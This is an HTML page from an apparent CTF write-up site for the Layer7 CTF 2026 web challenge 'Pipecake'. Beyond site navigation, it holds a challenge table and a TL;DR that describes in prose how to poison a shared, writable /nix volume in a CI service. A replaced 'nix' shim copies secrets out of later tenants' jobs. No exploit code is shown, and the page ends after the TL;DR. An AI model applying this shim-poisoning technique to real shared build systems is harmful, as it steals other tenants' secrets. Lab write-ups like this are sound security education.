@@ -1,0 +1,1853 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="English write-ups for Layer7 CTF 2026 (Jeopardy + KoTH) with captured evidence and verified flags.">
+      
+      
+        <meta name="author" content="B0TCIL">
+      
+      
+        <link rel="canonical" href="https://fijarsatria.github.io/layer7-ctf-2026-writeups/challenges/10-pipecake/">
+      
+      
+        <link rel="prev" href="../../koth/koth-stage-6/">
+      
+      
+        <link rel="next" href="../11-forgotten/">
+      
+      
+      <link rel="icon" href="../../assets/layer7.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Pipecake - Layer7 CTF 2026 — Write-ups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/layer7.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tldr" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-header__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Layer7 CTF 2026 — Write-ups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pipecake
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-nav__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    Layer7 CTF 2026 — Write-ups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reproducibility/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reproducibility
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evidence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Evidence index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../koth/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    KoTH
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            KoTH
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Glasshouse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 1 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 2 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 3 — Glasshouse VM (Capability Confusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 4 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 5 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 6 — Glasshouse VM (Split Decoder)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    WEB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            WEB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Pipecake
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pipecake
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-forgotten/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forgotten
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../22-roupang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Roupang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    PWN
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            PWN
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-whos-your-bias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    whos your bias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-cartridge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cartridge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-janus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Janus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-dead-letter/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dead Letter
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    REV
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            REV
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14-mad-rabbit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mad rabbit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../17-false-friends/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    False Friends
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../20-prism-box/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prism Box
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-autoby/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Autoby
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    MISC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            MISC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-mic-check/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mic_check
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-human-top-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    human top 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="pipecake">Pipecake<a class="headerlink" href="#pipecake" title="Permanent link">&para;</a></h1>
+<p><span class="nx-badge nx-badge-verified">VERIFIED</span> <span class="nx-chip">WEB</span> <span class="nx-chip">998 pts</span> <span class="nx-chip">id 10</span></p>
+
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Event</td>
+<td>Layer7 CTF 2026</td>
+</tr>
+<tr>
+<td>Category</td>
+<td><code>web</code></td>
+</tr>
+<tr>
+<td>Points</td>
+<td><code>998</code></td>
+</tr>
+<tr>
+<td>Solved at</td>
+<td><code>2026-11-21 10:17:32+07:00</code></td>
+</tr>
+<tr>
+<td>Flag</td>
+<td><code>Layer7{p0isoned_cak3}</code></td>
+</tr>
+<tr>
+<td>Status</td>
+<td><code>VERIFIED</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="pipecake-layer7-ctf-2026-web-998-pts">Pipecake — Layer7 CTF 2026 (web, 998 pts)<a class="headerlink" href="#pipecake-layer7-ctf-2026-web-998-pts" title="Permanent link">&para;</a></h1>
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<p>Pipecake runs every CI job as <strong>root</strong> inside a container that bind-mounts a
+single <strong>shared, writable <code>/nix</code> volume</strong>. The Nix profile used to resolve the
+<code>nix</code> binary (<code>/root/.nix-profile -&gt; /nix/var/nix/profiles/default -&gt;
+/nix/var/pipecake-&lt;deployment&gt;/profile-*</code>) lives on that volume too. A job from
+one tenant can therefore replace the <code>nix</code> shim with a tiny shell script. Every
+later job — including the challenge's <code>imnyang/flag-vault</code> deployment job —
+invokes <code>nix</code> before its own steps, so the shim executes first and copies
+<code>Layer7{...}</code> out of the victim's environment and <code>/workspace</code> into the shared
+volume. Reading that capture gave the flag:</p>
+<div class="highlight"><pre><span></span><code>Layer7{p0isoned_cak3}
+</code></pre></div>
